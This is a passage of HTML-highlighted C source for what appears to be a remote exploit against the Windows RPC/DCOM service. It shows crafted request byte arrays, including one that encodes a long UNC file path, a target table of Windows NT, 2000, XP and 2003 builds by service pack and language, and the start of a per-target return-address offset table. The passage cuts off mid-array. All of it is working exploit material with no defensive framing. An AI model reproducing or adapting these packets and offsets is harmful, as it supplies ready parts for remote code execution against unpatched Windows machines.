</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x10</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x08</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0x48</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x07</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x66</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x06</span><span class="sc10">,</span><span class="sc4">0x09</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x02</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xC0</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x46</span><span class="sc10">,</span><span class="sc4">0x10</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x78</span><span class="sc10">,</span><span class="sc4">0x19</span><span class="sc10">,</span><span class="sc4">0x0C</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x58</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x05</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x06</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x70</span><span class="sc10">,</span><span class="sc4">0xD8</span><span class="sc10">,</span><span class="sc4">0x98</span><span class="sc10">,</span><span class="sc4">0x93</span><span class="sc10">,</span><span class="sc4">0x98</span><span class="sc10">,</span><span class="sc4">0x4F</span><span class="sc10">,</span><span class="sc4">0xD2</span><span class="sc10">,</span><span class="sc4">0x11</span><span class="sc10">,</span><span class="sc4">0xA9</span><span class="sc10">,</span><span class="sc4">0x3D</span><span class="sc10">,</span><span class="sc4">0xBE</span><span class="sc10">,</span><span class="sc4">0x57</span><span class="sc10">,</span><span class="sc4">0xB2</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x32</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x31</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x10</span><span class="sc10">,</span><span class="sc4">0x08</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0x80</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x0D</span><span class="sc10">,</span><span class="sc4">0xF0</span><span class="sc10">,</span><span class="sc4">0xAD</span><span class="sc10">,</span><span class="sc4">0xBA</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x18</span><span class="sc10">,</span><span class="sc4">0x43</span><span class="sc10">,</span><span class="sc4">0x14</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x60</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x60</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x4D</span><span class="sc10">,</span><span class="sc4">0x45</span><span class="sc10">,</span><span class="sc4">0x4F</span><span class="sc10">,</span><span class="sc4">0x57</span><span class="sc10">,</span><span class="sc4">0x04</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xC0</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xC0</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x46</span><span class="sc10">,</span><span class="sc4">0x3B</span><span class="sc10">,</span><span class="sc4">0x03</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xC0</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x46</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x30</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x81</span><span class="sc10">,</span><span class="sc4">0xC5</span><span class="sc10">,</span><span class="sc4">0x17</span><span class="sc10">,</span><span class="sc4">0x03</span><span class="sc10">,</span><span class="sc4">0x80</span><span class="sc10">,</span><span class="sc4">0x0E</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0xE9</span><span class="sc10">,</span><span class="sc4">0x4A</span><span class="sc10">,</span><span class="sc4">0x99</span><span class="sc10">,</span><span class="sc4">0x99</span><span class="sc10">,</span><span class="sc4">0xF1</span><span class="sc10">,</span><span class="sc4">0x8A</span><span class="sc10">,</span><span class="sc4">0x50</span><span class="sc10">,</span><span class="sc4">0x6F</span><span class="sc10">,</span><span class="sc4">0x7A</span><span class="sc10">,</span><span class="sc4">0x85</span><span class="sc10">,</span><span class="sc4">0x02</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x10</span><span class="sc10">,</span><span class="sc4">0x08</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0x30</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x78</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x6E</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xD8</span><span class="sc10">,</span><span class="sc4">0xDA</span><span class="sc10">,</span><span class="sc4">0x0D</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x20</span><span class="sc10">,</span><span class="sc4">0x2F</span><span class="sc10">,</span><span class="sc4">0x0C</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x03</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x03</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x46</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x58</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x10</span><span class="sc10">,</span><span class="sc4">0x08</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0x10</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x30</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x2E</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x10</span><span class="sc10">,</span><span class="sc4">0x08</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0x68</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x0E</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xFF</span><span class="sc10">,</span><span class="sc4">0xFF</span><span class="sc10">,</span><span class="sc4">0x68</span><span class="sc10">,</span><span class="sc4">0x8B</span><span class="sc10">,</span><span class="sc4">0x0B</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x02</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">request2</span><span class="sc10">[]={</span><span class="sc0">
</span><span class="sc4">0x20</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x20</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x5C</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x5C</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">request3</span><span class="sc10">[]={</span><span class="sc0">
</span><span class="sc4">0x5C</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x43</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x24</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x5C</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x31</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x32</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x33</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x34</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x35</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x36</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x31</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x31</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x31</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x31</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x31</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x31</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x31</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x31</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x31</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x31</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x31</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x31</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x31</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x31</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x31</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x2E</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x64</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x6F</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x63</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">};</span><span class="sc0">


</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">targets</span><span class="sc0"> </span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc6">"Windows NT SP4 (english)"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Windows NT SP5 (chineese)"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Windows NT SP6 (chineese)"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Windows NT SP6a (chineese)"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Windows 2000 NOSP (polish)"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Windows 2000 SP3 (polish)"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Windows 2000 SP4 (spanish)"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Windows 2000 NOSP1 (english)"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Windows 2000 NOSP2 (english)"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Windows 2000 SP2-1 (english)"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Windows 2000 SP2-2 (english)"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Windows 2000 SP3-2 (english)"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Windows 2000 NOSP (chineese)"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Windows 2000 SP1 (chineese)"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Windows 2000 SP2 (chineese)"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Windows 2000 SP3 (chineese)"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Windows 2000 SP4 (chineese)"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Windows 2000 SP3 (german)"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Windows 2000 NOSP (japaneese"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Windows 2000 SP1 (japaneese)"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Windows 2000 SP2 (japaneese)"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Windows 2000 NOSP (korean)"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Windows 2000 SP1 (korean)"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Windows 2000 SP2 (korean)"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Windows 2000 NOSP (mexican)"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Windows 2000 SP1 (mexican)"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Windows XP NOSP (english)"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Windows SP1-2 (english)"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Windows 2k3 (english)"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Windows 2000 SP3 (german)"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Windows 2000 SP4-1 (german)"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Windows 2000 SP4-2 (german)"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Windows XP SP1 (german)"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Windows 2000 SERVER SP1 (french)"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Windows 2000 SERVER SP4 (french)"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Windows XP NOSP (french)"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Windows XP SP1 (french)"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Windows 2000 SP0 (english)"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Windows 2000 SP1 (english)"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Windows 2000 SP2 (english)"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Windows 2000 SP3 (english)"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Windows 2000 SP4 (english)"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Windows XP SP0 (english)"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Windows XP SP1-1 (english)"</span><span class="sc10">,</span><span class="sc0"> 
</span><span class="sc6">"Windows XP SP2 (english)"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Windows 2000 Advanced Server SP3 (english)"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"ALL/WINXP/WIN2K"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc5">NULL</span><span class="sc0"> 
</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">offsets</span><span class="sc0"> </span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> 
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc4">0x77e527f3</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x77cfdaee</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x77ac0ef0</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x77c3eaf0</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x774d3fe3</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x77292ce4</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x77133ba5</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x777416e8</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x772b49e2</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x77b524e8</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x775cfa2e</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x772ae3e2</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x778b89e6</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x772b49e0</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x77444342</span><span class="sc10">,</span><span class="sc0">
